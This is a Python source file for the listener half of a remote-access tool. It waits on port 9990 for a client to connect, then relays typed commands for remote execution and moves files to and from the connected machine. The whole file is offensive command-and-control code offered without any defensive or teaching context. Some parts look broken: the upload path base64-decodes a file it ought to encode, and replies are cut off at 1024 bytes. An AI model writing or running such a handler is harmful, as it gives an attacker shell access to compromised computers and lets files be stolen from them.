from  datetime import datetime
import json
import socket 
import base64
from typing import List
from array import *
import time

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("0.0.0.0", 9990))
listener.listen(0)
print("[+] Waiting for incoming connections")
cl_socket, remote_address = listener.accept()
print(f"[+] Got a connection from {remote_address} ")

try:

    while True:
        command :str = input(">> ")
        
        
        if "upload" in command:
            command_name, path_in_server, path_in_client = command.split(' ')
            with open(path_in_server, '+rb') as file:
                data = file.read()
            b64 = base64.b64decode(data)
            

            command_on_client :str = command_name +' '+ path_in_client
            print(command_on_client)
            cl_socket.send(command_on_client.encode())
            time.sleep(1)
            cl_socket.send(b64)
            print("The file has been sent")

        elif "download" in command:
            command_name, path_in_server, path_in_client = command.split(' ')
            command_out = command_name + ' ' + path_in_client
            cl_socket.send(command_out.encode())
            file = cl_socket.recv(1024).decode()
            with open(path_in_server, 'wb') as output_file:
                output_file.write(base64.b64decode(file))

        else:
            cl_socket.send(command.encode())
            response = cl_socket.recv(1024).decode()
            print(response)

        
        #mas: array = array()
        #массив передовать
        
except KeyboardInterrupt:
    listener.close()
    exit()